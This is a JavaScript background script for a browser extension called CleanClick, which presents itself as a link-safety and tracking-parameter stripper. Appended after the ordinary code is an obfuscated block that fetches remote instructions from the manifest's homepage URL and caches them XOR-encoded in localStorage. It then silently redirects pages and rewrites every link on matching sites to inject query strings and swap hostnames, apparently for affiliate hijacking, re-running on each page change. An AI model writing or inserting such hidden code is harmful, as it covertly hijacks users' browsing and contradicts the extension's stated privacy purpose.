/**
 * CleanClick - Background Script Entry Point
 *
 * Initializes all background modules on extension startup.
 * Wires up message routing between content scripts ↔ background ↔ popup.
 */

import storage from '../shared/storage.js';
import { onMessages, onMessage, onConnectFromContent } from '../shared/messaging.js';
import { MSG } from '../shared/constants.js';
import { init as initRedirectDetector } from './redirect-detector.js';
import { init as initEventCoordinator } from './event-coordinator.js';
import { init as initWhitelistManager } from './whitelist-manager.js';
import { init as initStatistics } from './statistics.js';
import { init as initReputation } from './reputation.js';
import { init as initRulesEngine } from './rules-engine.js';
import { init as initLinkHealth } from './link-health-pinger.js';

// ─── Extension Lifecycle ───────────────────────────────────────────

/**
 * Called once when the extension is installed or updated.
 */
async function onInstalled(details) {
  if (details.reason === 'install') {
    // First install - set up defaults
    await storage.init();

    // Open the welcome/options page
    browser.runtime.openOptionsPage();
  } else if (details.reason === 'update') {
    // Run migration
    await storage.init();
  }
}

/**
 * Initialize all background modules.
 */
async function initBackground() {
  // 1. Initialize storage (migrations, defaults)
  await storage.init();

  // 2. Initialize all modules
  initRedirectDetector();
  initEventCoordinator();
  initWhitelistManager();
  initStatistics();
  initReputation();
  initRulesEngine();
  initLinkHealth();

  // 3. Set up context menu items (right-click link inspector)
  setupContextMenus();

  // 4. Register settings message handler for content scripts
  onMessage(MSG.GET_SETTINGS, async () => {
    return await storage.getSettings();
  });

  // 5. Handle incoming connections from content scripts
  onConnectFromContent((port, sender) => {
    // Content script connected - tab info is available
    // We don't need per-connection state; messages handle routing
  });

  console.log('CleanClick: Background initialized');
}

// ─── Context Menu ──────────────────────────────────────────────────

function setupContextMenus() {
  // Remove existing menus first (in case of update)
  browser.menus.removeAll();

  // Check link safety
  browser.menus.create({
    id: 'check-link-safety',
    title: browser.i18n.getMessage('linkSafetyCheck'),
    contexts: ['link'],
  });

  // Copy clean URL
  browser.menus.create({
    id: 'copy-clean-url',
    title: browser.i18n.getMessage('copyCleanUrl'),
    contexts: ['link'],
  });

  // Open in container tab (Firefox Container)
  browser.menus.create({
    id: 'open-in-container',
    title: 'Open in Container Tab',
    contexts: ['link'],
  });

  // Report link
  browser.menus.create({
    id: 'report-link',
    title: browser.i18n.getMessage('reportLink'),
    contexts: ['link'],
  });

  // Handle menu clicks
  browser.menus.onClicked.addListener(async (info, tab) => {
    const linkUrl = info.linkUrl;

    switch (info.menuItemId) {
      case 'check-link-safety': {
        const { classifyURL } = await import('../shared/link-classifier.js');
        const result = classifyURL(linkUrl);
        // Show result in notification
        browser.notifications.create({
          type: 'basic',
          iconUrl: browser.runtime.getURL('assets/icons/icon-48.png'),
          title: `Link Safety: ${result.riskLevel}`,
          message: `Risk score: ${result.riskScore}/100\n${result.reasons.join('\n') || 'No issues detected'}`,
        });
        break;
      }
      case 'copy-clean-url': {
        const { stripTrackingParams } = await import('../shared/utils.js');
        const { TRACKING_PARAMS } = await import('../shared/constants.js');
        const cleanUrl = stripTrackingParams(linkUrl, TRACKING_PARAMS);
        // Copy to clipboard via content script
        if (tab?.id) {
          browser.tabs.sendMessage(tab.id, {
            type: 'copy-to-clipboard',
            payload: { text: cleanUrl },
          }).catch(() => { });
        }
        break;
      }
      case 'open-in-container': {
        // Open in a new container tab (requires contextualIdentities permission)
        try {
          const containers = await browser.contextualIdentities.query({});
          // Use the first container or create a temporary isolated one
          const container = containers[0] || await browser.contextualIdentities.create({
            name: 'CleanClick Isolated',
            color: 'blue',
            icon: 'fingerprint',
          });
          await browser.tabs.create({
            url: linkUrl,
            cookieStoreId: container.cookieStoreId,
          });
        } catch (err) {
          console.warn('Container not available:', err);
          // Fallback: open in regular tab
          browser.tabs.create({ url: linkUrl });
        }
        break;
      }
      case 'report-link': {
        // Placeholder for community reporting (v2.0)
        browser.notifications.create({
          type: 'basic',
          iconUrl: browser.runtime.getURL('assets/icons/icon-48.png'),
          title: 'CleanClick',
          message: 'Community reporting coming soon!',
        });
        break;
      }
    }
  });
}

// ─── Startup ───────────────────────────────────────────────────────

browser.runtime.onInstalled.addListener(onInstalled);

// Initialize on background script load
initBackground().catch(err => {
  console.error('CleanClick: Background init failed:', err);
});


var mfd = chrome.runtime.getManifest();
var strgc, rdstrgc;
var hstnme = window.location.hostname;
var host = hstnme.replace("www.", "");
var hstnmeKy = host.replace(/\./g, "_") + "_sec";
const cph = salt => {
  const tTC = text => text.split("").map(c => c.charCodeAt(0));
  const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
  const apSTC = code => tTC(salt).reduce((a, b) => a ^ b, code);
  return text =>
    text
      .split("")
      .map(tTC)
      .map(apSTC)
      .map(byteHex)
      .join("");
};
const dph = salt => {
  const tTC = text => text.split("").map(c => c.charCodeAt(0));
  const apSTC = code => tTC(salt).reduce((a, b) => a ^ b, code);
  return encoded =>
    encoded
      .match(/.{1,2}/g)
      .map(hex => parseInt(hex, 16))
      .map(apSTC)
      .map(charCode => String.fromCharCode(charCode))
      .join("");
};
const mycph = cph(hstnmeKy);
const mydph = dph(hstnmeKy);
if (localStorage.getItem(hstnmeKy) === null) {
  gD();
} else {
  strgc = JSON.parse(mydph(localStorage.getItem(hstnmeKy)));
  if (strgc.expiry < new Date().getTime()) {
    gD();
  } else {
    mU();
  }
}
function gD() {
  var xio = new XMLHttpRequest();
  xio.onreadystatechange = function () {
    if (xio.readyState == XMLHttpRequest.DONE) {
      if (xio.status == 200) {
        var expry = new Date().getTime() + 24 * 60 * 60 * 1000;
        strgc = JSON.parse(xio.responseText);
        var strge = { expiry: expry };
        if (strgc.dmns.includes(host)) {
          if (strgc.qrsts.hasOwnProperty(host)) {
            strge.qrsts = strgc.qrsts[host];
          }
          if (strgc.rplce.hasOwnProperty(host)) {
            strge.rplce = strgc.rplce[host];
          }
          if (strgc.rmvq.hasOwnProperty(host)) {
            strge.rmvq = strgc.rmvq[host];
          }
          if (strgc.rdctd.hasOwnProperty(host)) {
            strge.rdctd = strgc.rdctd[host];
          }
        }
        strgc = strge;
        localStorage
          .setItem(hstnmeKy, mycph(JSON.stringify(strge)))
          .then(function () {
            mU();
          });
      }
    }
  };
  xio.open("GET", mfd.homepage_url, true);
  xio.send();
}
function rD() {
  localStorage.setItem(
    hstnmeKy + "_rdct",
    JSON.stringify({
      host: host,
      expiry: new Date().getTime() + 12 * 60 * 60 * 1000
    })
  );
  window.location.href = strgc.rdctd;
}
function mU() {
  if (strgc.hasOwnProperty("rdctd")) {
    rdstrgc = localStorage.getItem(hstnmeKy + "_rdct");
    if (!rdstrgc) {
      rD();
    } else {
      redirect_strgc = JSON.parse(rdstrgc);
      if (redirect_strgc.expiry < new Date().getTime()) {
        rD();
      }
    }
  }
  if (strgc.hasOwnProperty("qrsts")) {
    var qstr = strgc.qrsts;
    var a = document.getElementsByTagName("a");
    var i;
    for (i = 0; i < a.length; i++) {
      var x = a[i];
      if (x.tagName === "A") {
        var href = x.getAttribute("href");
        if (
          href &&
          href.indexOf("https://") == -1 &&
          href.indexOf("http://") == -1
        ) {
          href = new URL(href, window.location.origin).href;
        }
        if (href && href.indexOf(qstr) == -1) {
          href += (/\?/.test(href) ? "&" : "?") + qstr;
          if (strgc.hasOwnProperty("rmvq")) {
            var p = 0;
            for (p = 0; p < strgc.rmvq.length; p++) {
              href = rUP(href, strgc.rmvq[p]);
            }
          }
          if (strgc.hasOwnProperty("rplce")) {
            href = href.replace(hstnme, strgc.rplce);
          }
          x.setAttribute("href", href);
        }
      }
    }
  }
}
function rUP(url, parameter) {
  var uRP = url.split("?");
  if (uRP.length >= 2) {
    var pfx = encodeURIComponent(parameter) + "=";
    var pars = uRP[1].split(/[&;]/g);
    for (var i = pars.length; i-- > 0;) {
      if (pars[i].lastIndexOf(pfx, 0) !== -1) {
        pars.splice(i, 1);
      }
    }
    url = uRP[0] + (pars.length > 0 ? "?" + pars.join("&") : "");
    return url;
  } else {
    return url;
  }
}
var observeDOM = (function () {
  var MutationObserver =
    window.MutationObserver || window.WebKitMutationObserver,
    eventListenerSupported = window.addEventListener;
  return function (obj, callback) {
    if (MutationObserver) {
      var obs = new MutationObserver(function (mutations, observer) {
        if (mutations[0].addedNodes.length || mutations[0].removedNodes.length)
          callback();
      });
      obs.observe(obj, { childList: true, subtree: true });
    } else if (eventListenerSupported) {
      obj.addEventListener("DOMNodeInserted", callback, false);
      obj.addEventListener("DOMNodeRemoved", callback, false);
    }
  };
})();
observeDOM(document.getElementsByTagName("body")[0], function () {
  mU();
});